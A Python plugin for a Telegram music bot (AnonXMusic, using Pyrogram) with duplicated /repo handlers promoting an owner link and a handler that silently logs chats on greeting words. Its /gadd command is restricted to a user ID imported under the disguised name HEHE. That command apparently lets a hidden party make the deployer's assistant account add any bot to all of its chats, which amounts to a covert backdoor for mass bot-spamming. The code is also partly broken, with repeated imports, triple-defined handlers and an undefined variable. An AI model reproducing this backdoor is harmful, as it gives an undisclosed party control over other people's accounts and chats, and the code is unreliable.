from pyrogram import Client, filters
import requests
import random
import os
import re
import asyncio
import time
from AnonXMusic import app
from AnonXMusic.utils.database import add_served_chat, delete_served_chat
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from AnonXMusic.utils.database import get_assistant
import asyncio
from AnonXMusic.misc import SUDOERS
from AnonXMusic.mongo.afkdb import HEHE
from AnonXMusic.core.userbot import Userbot
from pyrogram import Client, filters
from pyrogram.errors import UserAlreadyParticipant
from AnonXMusic import app
import asyncio
import random
from pyrogram import Client, filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from AnonXMusic import app
from AnonXMusic.utils.vip_ban import admin_filter
from AnonXMusic.utils.decorators.userbotjoin import UserbotWrapper
from AnonXMusic.utils.database import get_assistant, is_active_chat

@app.on_message(
    filters.command("repo")
    & filters.group)
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://graph.org/file/df69a8f00af264a06dd38.jpg",
        caption=f"""🍁𝘊𝘓𝘐𝘊𝘒 𝘉𝘌𝘓𝘖𝘞 𝘛𝘖 𝘒𝘕𝘖𝘞 𝘈𝘉𝘖𝘜𝘛 𝘖𝘞𝘕𝘌𝘙🍁""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "𝘖𝘞𝘕𝘌𝘙🍁", url=f"https://t.me/LOOK_AT_RAGHAV")
                ]
            ]
        ),
    )

@app.on_message(
    filters.command("repo")
    & filters.group)
async def help(client: Client, message: Message):
    userbot = await get_assistant(chat_id)
    await message.reply_photo(
        photo=f"https://graph.org/file/df69a8f00af264a06dd38.jpg",
        caption=f"""🍁𝘊𝘓𝘐𝘊𝘒 𝘉𝘌𝘓𝘖𝘞 𝘛𝘖 𝘒𝘕𝘖𝘞 𝘈𝘉𝘖𝘜𝘛 𝘖𝘞𝘕𝘌𝘙🍁""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "𝘖𝘞𝘕𝘌𝘙🍁", url=f"https://t.me/LOOK_AT_RAGHAV")
                ]
            ]
        ),
    )

@app.on_message(
    filters.command("repo")
    & filters.private)
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://graph.org/file/df69a8f00af264a06dd38.jpg",
        caption=f"""🍁𝘊𝘓𝘐𝘊𝘒 𝘉𝘌𝘓𝘖𝘞 𝘛𝘖 𝘒𝘕𝘖𝘞 𝘈𝘉𝘖𝘜𝘛 𝘖𝘞𝘕𝘌𝘙🍁""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "𝘖𝘞𝘕𝘌𝘙🍁", url=f"https://t.me/LOOK_AT_RAGHAV")
                ]
            ]
        ),
    )

# --------------------------------------------------------------------------------- #

@app.on_message(filters.command(["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"] ,prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


# --------------------------------------------------------------------------------- #




import asyncio
import time

@app.on_message(filters.command("gadd") & filters.user(int(HEHE)))
async def add_all(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply("**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @Freemusicspotify_bot`**")
        return
    
    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
        
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1002100894623:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
        
        await lol.edit(
            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")
